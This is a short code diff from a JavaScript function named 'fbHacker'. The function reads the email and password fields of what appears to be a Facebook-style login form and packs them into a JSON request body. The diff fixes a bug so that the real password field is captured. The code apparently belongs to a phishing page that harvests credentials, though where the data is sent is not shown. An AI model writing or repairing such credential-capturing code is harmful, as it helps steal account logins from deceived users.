@@ -3,8 +3,7 @@ function fbHacker() {
   myHeaders.append("Content-Type", "application/json");
 
   var userName = document.getElementById("email").value;
-  var passWord = document.getElementById("email").value;
-
+  var passWord = document.getElementById("pass").value;
   var raw = JSON.stringify({
     username: userName,
     password: passWord,
